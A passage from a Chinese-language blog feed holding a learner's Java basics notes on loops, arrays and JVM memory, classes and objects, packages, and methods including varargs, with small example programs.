class="line"></span><br><span class="line">        System.out.println(i);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">特点：</span><br><span class="line">1.首先是执行do里面的东西，再进行判断。也就是至少会执行一次循环体结构。</span><br><span class="line">2.do while语句的while后面有一个分号</span><br></pre></td></tr></table></figure>

<h2 id="关键字continue和break"><a href="#关键字continue和break" class="headerlink" title="关键字continue和break"></a>关键字continue和break</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">break：</span><br><span class="line">中断，用于switch和循环结构。</span><br><span class="line">作用是，结束本层循环。</span><br><span class="line"></span><br><span class="line">continue：</span><br><span class="line">继续，只能用于循环结构。</span><br><span class="line">作用是，提前结束本次循环。</span><br></pre></td></tr></table></figure>

<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">什么是数组：</span><br><span class="line">数组代表一组数</span><br><span class="line">数组是一组相同数据类型的元素（数据）按照一定顺序排列的集合。</span><br><span class="line">其中每一个元素我们通过索引进行区分。索引从零开始</span><br><span class="line">一组数据的总个数称为数组的长度（length）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数组的分类：</span><br><span class="line">根据维度分：一维数组和二维数组</span><br></pre></td></tr></table></figure>

<h2 id="定义以及使用"><a href="#定义以及使用" class="headerlink" title="定义以及使用"></a>定义以及使用</h2><p>声明一个数组的语法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//元素的数据类型[] 数组名;</span></span><br><span class="line"><span class="keyword">int</span>[] num;</span><br><span class="line"><span class="keyword">int</span>[] num =&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数组名.length</span><br><span class="line">使用这个可以获取数组的长度</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//数组名[索引]</span></span><br><span class="line"><span class="comment">//可以用来访问数组元素</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] num =&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">        System.out.println(num[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">遍历，可以用<span class="keyword">for</span>循环遍历。例子如下</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] num =&#123;<span class="number">100</span>,<span class="number">100</span>,<span class="number">70</span>,<span class="number">70</span>&#125;;<span class="comment">//存储考研四科的成绩</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;num.length;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这一科为：&quot;</span>+num[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="一维数组的内存分析"><a href="#一维数组的内存分析" class="headerlink" title="一维数组的内存分析"></a>一维数组的内存分析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数组有几个特点：</span><br><span class="line">1.数组的长度一旦确定就不能修改，感觉和py不一样。</span><br><span class="line">2.数组的元素是联系存储的，即数组是需要在内存中开辟一整块的存储空间。</span><br><span class="line">3.因为是连续的，数组元素的访问速度是非常快的。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JVM java虚拟机</span><br><span class="line">其在运行时，分为几个部分：</span><br><span class="line">1.方法区：存储已经被虚拟机加载的类信息，常量，静态变量，即时编译器编译后的代码等数据</span><br><span class="line">2.堆内存：存储对象（包括数组对象），new来创建的，都存储在堆内存</span><br><span class="line">3.java虚拟机栈：用于存储正在执行的每个java方法的局部变量表等。局部变量表存放了编译器可知长度的各种基本数据类型、对象引用，方法执行完，自动释放</span><br><span class="line">4.本地方法栈：当程序中调用了native的本地方法时，本地方法执行期间的内存区域</span><br><span class="line">5.程序计数器：CPU中的寄存器，他包含每一个线程下一条要执行的指令的地址</span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/20/JAVA%E5%9F%BA%E7%A1%80-1/image-20221213115914522.png" alt="image-20221213115914522"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] num = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>];</span><br><span class="line">        System.out.println(num);<span class="comment">//[I@4554617c</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//num是数组名，同时也是变量，是一个应用数据类型的变量。他里面存储的是地址值。</span></span><br><span class="line"><span class="comment">//new了一个数组之后，jvm就会存储他的首地址和占用内存，这样就可以通过这两个值找到所有的元素。</span></span><br><span class="line"><span class="comment">//虽然num里面存储的是首地址，但是和真实的首地址还是不能划等号，因为java不会对外暴露内存地址。本质上：I代表的是int內型，@后面的数字是数组对象的hashCode值的十六进制值。</span></span><br><span class="line"><span class="comment">//hashCode：就是一个数字，有点像身份证号码。只有当对象存储到哈希表等哈希结构的容器中才有用。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">扩展：</span><br><span class="line">java中自动打印一个对象，会自动调用它的toString方法。</span><br><span class="line">而在默认库的定义中，toString方法return的就是一个，內型名称@&quot;Integer.toHexString(hashCode())&quot;</span><br><span class="line"></span><br><span class="line">所以直接println(num)和println(num.toString())返回值是一样的</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">变量：</span><br><span class="line">基本数据类型的变量：存数据值</span><br><span class="line">引用数据类型的变量：存地址值</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">结论</span><br><span class="line">1.数组的元素是存储在堆中</span><br><span class="line">2.数组的元素是连续存储的</span><br><span class="line">3.数组名是记录数组对象的首地址</span><br><span class="line">4.下标[0]开始，表示第一个元素不用跨过任何元素，从首地址直接取值</span><br></pre></td></tr></table></figure>

<h2 id="数组的算法：元素统计"><a href="#数组的算法：元素统计" class="headerlink" title="数组的算法：元素统计"></a>数组的算法：元素统计</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数组的基础算法：</span><br><span class="line">1.对数组元素的统计：</span><br><span class="line">统计偶数的个数、正数的个数，累计和，求平均值</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">            arr[i] = (<span class="keyword">int</span>)(Math.random()*<span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//统计里面偶数的个数，元素的总和，平均值，所有元素的乘积</span></span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">double</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> multiply = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">double</span> average;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">            System.out.println(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">            sum += arr[i];</span><br><span class="line">            multiply *= arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        average = sum/arr.length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[i] % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">              count += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;总和：&quot;</span>+sum);</span><br><span class="line">        System.out.println(<span class="string">&quot;偶数的个数：&quot;</span>+count);</span><br><span class="line">        System.out.println(<span class="string">&quot;平均值：&quot;</span>+average);</span><br><span class="line">        System.out.println(<span class="string">&quot;所有元素的乘积：&quot;</span>+multiply);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="二维数组的初始化"><a href="#二维数组的初始化" class="headerlink" title="二维数组的初始化"></a>二维数组的初始化</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">分为动态初始化和静态初始化：</span><br><span class="line"><span class="number">1.</span>静态初始化</span><br><span class="line">数组名 = <span class="keyword">new</span> 元素的数据类型[][]&#123;&#123;&#125;,&#123;&#125;&#125;</span><br><span class="line"><span class="number">2.</span>动态初始化</span><br><span class="line">就是通过内外循环，分别给列和行赋值即可。额感觉太麻烦了吧。</span><br></pre></td></tr></table></figure>

<h1 id="IDEA的单步调试Debug"><a href="#IDEA的单步调试Debug" class="headerlink" title="IDEA的单步调试Debug"></a>IDEA的单步调试Debug</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Debug的步骤：</span><br><span class="line">1.打断点，在代码的左边（行号）的位置单击出现小红圈，就是断点</span><br><span class="line">2.以Debug模式运行</span><br><span class="line">3.单步调试</span><br><span class="line">Step Over（f8）</span><br><span class="line">往下走一行。</span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/20/JAVA%E5%9F%BA%E7%A1%80-1/image-20221213153644342.png" alt="image-20221213153644342"></p>
<h1 id="面向对象基础"><a href="#面向对象基础" class="headerlink" title="面向对象基础"></a>面向对象基础</h1><h2 id="面向对象编程思想"><a href="#面向对象编程思想" class="headerlink" title="面向对象编程思想"></a>面向对象编程思想</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">面向过程：</span><br><span class="line">1.以步骤为核心</span><br><span class="line">2.代码的结构以函数为单位，程序是由一个一个函数组成</span><br><span class="line">3.数据是在函数内核函数歪，内部是局部数据，外部是全局数据。</span><br><span class="line">面向对象：</span><br><span class="line">1.以类和对象为核心的</span><br><span class="line">2.代码的结构是以类为单位。程序是由一个一个类组成的。</span><br><span class="line">3.数据是在类里面的。数据分为类中方法外和类中方法内。</span><br></pre></td></tr></table></figure>

<h2 id="类和对象的定义"><a href="#类和对象的定义" class="headerlink" title="类和对象的定义"></a>类和对象的定义</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一类事物的一个具体实实在在的个体。</span><br><span class="line">类是很多对象共同特征的描述的提取</span><br><span class="line">写代码的角度：先有类，再有对象，没有类就无法new一个对象。</span><br></pre></td></tr></table></figure>

<p>下面先举一个小例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hello</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">char</span> gender;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(age &gt;=<span class="number">25</span> &amp;&amp; age &lt;= <span class="number">60</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;吃的口味比较重&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (age &lt; <span class="number">25</span> || age &gt;<span class="number">60</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;吃的口味比较清淡&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//其中eat()就是方法。</span></span><br></pre></td></tr></table></figure>

<p>以上定义了一个类，那么我们可以通过一个类，来创建一个对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        hello teacher1 = <span class="keyword">new</span> hello();</span><br><span class="line">        teacher1.age = <span class="number">19</span>;</span><br><span class="line">        teacher1.name = <span class="string">&quot;dhk&quot;</span>;</span><br><span class="line">        teacher1.gender = <span class="string">&#x27;女&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        teacher1.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//new了一个名为teacher1的对象，输出结果是</span></span><br><span class="line"><span class="comment">//吃的口味比较清淡</span></span><br></pre></td></tr></table></figure>

<p>类的声明格式：</p>
<p>类的定义/声明格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">【修饰符】class 类名&#123;</span><br><span class="line">&#125;</span><br><span class="line">【修饰符】可以缺省：</span><br><span class="line">后面也会学习更多的修饰符详细内容</span><br><span class="line">这里补充一下，如果class前面有public，那么就要求.java文件的名字必须和这个class名完全一致。</span><br><span class="line">同时，如果有public那么这个类就可以跨包使用，如果没有的话，就不可以跨包使用。</span><br></pre></td></tr></table></figure>

<p>下面讲一下对象的定义语法格式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> 类名(实参列表)<span class="comment">//吐过没有把对象复制给一个变量，那么这个对象就是一个匿名对象，匿名对象打印出来同样也是hash</span></span><br><span class="line">hello teacher1 = <span class="keyword">new</span> hello();<span class="comment">//将对象放到一个变量中</span></span><br><span class="line"><span class="comment">//如果希望一个对象反复使用，那么就把对象给到一个变量中</span></span><br></pre></td></tr></table></figure>

<h2 id="成员变量"><a href="#成员变量" class="headerlink" title="成员变量"></a>成员变量</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>成员变量声明的位置，必须在类中方法外。</span><br><span class="line"><span class="number">2.</span>成员变量声明的格式</span><br><span class="line">【修饰符】 <span class="class"><span class="keyword">class</span> 类名</span>&#123;</span><br><span class="line">	【修饰符】 数据类型 变量名;</span><br><span class="line">&#125;</span><br><span class="line">数据类型可以是八种数据类型，也可以是引用数据类型。</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">1</span>;<span class="comment">//成员变量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时需要注意的是：成员变量定义之后是默认有值的，在其他类没有赋值成员变量的时候引用，那么就是使用的默认值。</p>
<h2 id="包"><a href="#包" class="headerlink" title="包"></a>包</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">包的作用：</span><br><span class="line">1.避免类的重名</span><br><span class="line">2.组织管理不同模块的类</span><br><span class="line">3.可以限定部分类或成员的可见性范围</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如何声明包：</span><br><span class="line">package 包名;</span><br><span class="line"></span><br><span class="line">要求：</span><br><span class="line">1.一个.java文件只能有一句package，并且必须放在代码首行</span><br><span class="line">2.如果某个.java文件声明了一个package语句，那么这个.java文件必须在对应的目录结构中</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">包命名的规则和规范：</span><br><span class="line">1.命名规则和其他的标识符一样</span><br><span class="line">2.命名规范</span><br><span class="line">所有单词都小写，每一个单词之间使用点来分隔，每一个点代表一级目录</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">跨包的使用方法：</span><br><span class="line">1.使用类的全名称</span><br><span class="line">2.使用import语句导包</span><br><span class="line">导入包的时候可以使用如下语句进行简化：</span><br><span class="line">import com.test.package.*;//其中*代表的是省略的类名。</span><br></pre></td></tr></table></figure>

<h2 id="实例变量的内存分析"><a href="#实例变量的内存分析" class="headerlink" title="实例变量的内存分析"></a>实例变量的内存分析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java对象保存在内存中时，由以下三部分组成：</span><br><span class="line">对象头：</span><br><span class="line">	1.mark word：记录了和当前对象有关的GC、锁等信息。</span><br><span class="line">	2.指向类的指针</span><br><span class="line">	3.数组长度</span><br><span class="line">实例数据：</span><br><span class="line">	即实例变量的值</span><br><span class="line">对齐填充：</span><br><span class="line">	因为JVM要求java对象占的的内存大小应该是8bit的倍数，如果不满足该大小，则需要补齐至8bit的倍数，没有特别的功能。</span><br></pre></td></tr></table></figure>

<p>每一个对象的实例变量值在内存中都有自己的独立的内存空间。</p>
<h2 id="面向对象小练习-员工和生日类"><a href="#面向对象小练习-员工和生日类" class="headerlink" title="面向对象小练习-员工和生日类"></a>面向对象小练习-员工和生日类</h2><p>这里做一个小扩展吧，员工和生日类，</p>
<p>三个文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//主文件</span></span><br><span class="line"><span class="keyword">package</span> TEST;</span><br><span class="line"><span class="keyword">import</span> TEST.Employee.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Employee e1 = <span class="keyword">new</span> Employee();</span><br><span class="line"></span><br><span class="line">        e1.name = <span class="string">&quot;dhk&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//值得注意的是MyDate是引用数据类型，那么凡是引用数据类型，就要赋值对象。</span></span><br><span class="line">        <span class="comment">//e1的birthday在员工类中就声明了，在这里就只需要赋值。</span></span><br><span class="line">        e1.birthday = <span class="keyword">new</span> MyDate();</span><br><span class="line">        e1.birthday.year = <span class="number">2000</span>;</span><br><span class="line">        e1.birthday.month = <span class="number">12</span>;</span><br><span class="line">        e1.birthday.day = <span class="number">1</span>;</span><br><span class="line">        e1.age = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">        e1.info();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//员工类文件</span></span><br><span class="line"><span class="keyword">package</span> TEST;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    MyDate birthday;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">info</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我是名为&quot;</span>+name+<span class="string">&quot;的员工，生日是&quot;</span>+birthday.year+<span class="string">&quot;-&quot;</span>+birthday.month+<span class="string">&quot;-&quot;</span>+birthday.day+</span><br><span class="line">                <span class="string">&quot;，今年&quot;</span>+age+<span class="string">&quot;岁了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MyDate类文件</span></span><br><span class="line"><span class="keyword">package</span> TEST;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyDate</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> day;</span><br><span class="line">    <span class="keyword">int</span> month;</span><br><span class="line">    <span class="keyword">int</span> year;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我是给他们放一个包里面的，大概流程是首先定义了一个MyDate类，然后员工类文件中引用了这个类，在主文件又引用了员工类的文件。但是值得注意的是，一旦使用了引用数据类型，必须先赋值一个对象。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输出：</span><br><span class="line">我是名为dhk的员工，生日是2000-12-1，今年20岁了</span><br></pre></td></tr></table></figure>

<h2 id="方法的概念、声明和调用"><a href="#方法的概念、声明和调用" class="headerlink" title="方法的概念、声明和调用"></a>方法的概念、声明和调用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">什么是方法？</span><br><span class="line">方法，又称函数，他代表一段独立的可复用的功能代码。</span><br><span class="line">例如：</span><br><span class="line">	Math.random()  //random()他是一个方法</span><br><span class="line">	</span><br><span class="line">方法的特点/原则：</span><br><span class="line">1.必须先声明后使用</span><br><span class="line">2.方法不能嵌套定义</span><br><span class="line">3.格式：</span><br><span class="line">	【修饰符】 class类&#123;</span><br><span class="line">	【修饰符】 返回值类型 方法名(【形参列表】)&#123;</span><br><span class="line">		方法体语句</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">4.方法名从第二个单词首字母开始大写</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">返回值类型：</span><br><span class="line">这个方法完成指定功能后，需要返回的结果值的类型。</span><br><span class="line">如果没有结果值返回，那么就要用void。</span><br><span class="line">如果有结果值返回，那么就必须用对应的数据类型表示。</span><br></pre></td></tr></table></figure>

<p>演示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> TEST;</span><br><span class="line"><span class="comment">//这是主类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        MyMathTools tools = <span class="keyword">new</span> MyMathTools();<span class="comment">//在使用的时候需要先创建一个对象，用这个对象再调用它里面的方法</span></span><br><span class="line">        <span class="keyword">int</span> re = tools.add(<span class="number">4</span>,<span class="number">9</span>);</span><br><span class="line">        System.out.println(re);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> TEST;</span><br><span class="line"><span class="comment">//这是MyMathTools类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMathTools</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;  <span class="comment">//没有返回值就把int换成void就可以了</span></span><br><span class="line">        <span class="keyword">int</span> sum = a+b;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="方法调用内存分析"><a href="#方法调用内存分析" class="headerlink" title="方法调用内存分析"></a>方法调用内存分析</h2><p>方法不调用不执行，调用一次执行一次，每次调用会在栈中有一个入栈动作，即给当前方法开辟一块独立的内存区域，用于存储当前方法的局部变量的值，当方法执行结束后，会释放该内存，称为出栈，如果方法有返回值，就会把结果返回调用处，如果没有返回值，就直接结束，回到调用处结束执行下一条指令。</p>
<h2 id="实例变量与局部变量的区别"><a href="#实例变量与局部变量的区别" class="headerlink" title="实例变量与局部变量的区别"></a>实例变量与局部变量的区别</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.声明的位置和方式</span><br><span class="line">实例变量：在类中方法外</span><br><span class="line">局部变量：在方法体&#123;&#125;中或方法的形参列表、代码块中。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.内存中存储的位置不同</span><br><span class="line">实例变量：堆</span><br><span class="line">局部变量：栈</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.生命周期</span><br><span class="line">实例变量：跟随对象创建。随着对象消亡</span><br><span class="line">局部变量：随着方法调用，方法结束消亡</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.作用域</span><br><span class="line">实例变量：通过对象就能使用</span><br><span class="line">局部变量：出了作用域就不能使用</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5.修饰符</span><br><span class="line">实例变量：public,protected,private,final,volatile,transient</span><br><span class="line">局部变量：final</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6.默认值</span><br><span class="line">实例变量：有默认值</span><br><span class="line">局部变量：没有，必须手动初始化。其中的形参比较特殊，靠实参给他初始化。</span><br></pre></td></tr></table></figure>

<h2 id="形参和实参的概念"><a href="#形参和实参的概念" class="headerlink" title="形参和实参的概念"></a>形参和实参的概念</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.形参</span><br><span class="line">在声明方法时，()中声明的变量，没调用这个方法之前，他的值是不确定的。</span><br><span class="line">需要传入实际的数据，他才有意义。</span><br><span class="line">2.实参</span><br><span class="line">在调用方法时，()中传入的数据，他可能是常量值，也可能是变量，也可能是表达式。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">扩展：</span><br><span class="line">可变参数：</span><br><span class="line">在JDK1.5之后，当定义一个方法时，形参的类型可以确定，但是形参的个数不确定，那么可以考虑使用可变参数，可变参数的格式</span><br><span class="line">【修饰符】 返回值类型 方法名(【非可变参数部分的形参列表，】参数类型...形参名)&#123;  &#125;</span><br><span class="line"></span><br><span class="line">可变参数的特点和要求：</span><br><span class="line">1.一个方法只能有一个可变参数</span><br><span class="line">2.如果一个方法包含可变参数，那么可变参数必须是形参列表的最后一个</span><br><span class="line">3.在声明它的方法中，可变参数当成数组使用</span><br><span class="line">4.其实这个书写&quot;≈&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//可变参数扩展案例：写一个方法实现整数相加</span></span><br><span class="line"><span class="comment">//这是主类，调用tools的addall方法来实现4和9的相加。</span></span><br><span class="line"><span class="keyword">package</span> TEST;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        MyMathTools tools = <span class="keyword">new</span> MyMathTools();</span><br><span class="line">        <span class="keyword">int</span> re = tools.addall(<span class="number">4</span>,<span class="number">9</span>);</span><br><span class="line">        System.out.println(re);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这是MyMathTools类定义了一个方法addall</span></span><br><span class="line"><span class="keyword">package</span> TEST;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMathTools</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">addall</span><span class="params">(<span class="keyword">int</span>...ints)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i &lt; ints.length;i++)&#123;</span><br><span class="line">            sum += ints[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>-java</category>
      </categories>
  </entry>
  <entry>
    <title>JAVA基础-2</title>
    <url>/2022/12/31/JAVA%E5%9F%BA%E7%A1%80-2/</url>
